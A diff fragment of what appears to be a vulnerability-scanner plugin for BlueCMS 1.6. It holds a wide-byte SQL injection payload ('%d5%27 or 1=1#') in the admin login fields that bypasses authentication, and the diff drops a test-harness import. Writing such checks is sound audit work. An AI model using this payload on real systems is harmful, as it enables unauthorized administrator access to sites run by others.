@@ -17,5 +17,5 @@ def audit(arg):
         security_hole(target+' && post: admin_name=hentai%d5%27%20or%201%3d1%23&admin_pwd=hentai&submit=%B5%C7%C2%BC&act=do_login')
 
 if __name__ == '__main__':
-    from dummy import *
+
     audit(assign('bluecms', 'http://127.0.0.1/bluecms-1.6/')[1])
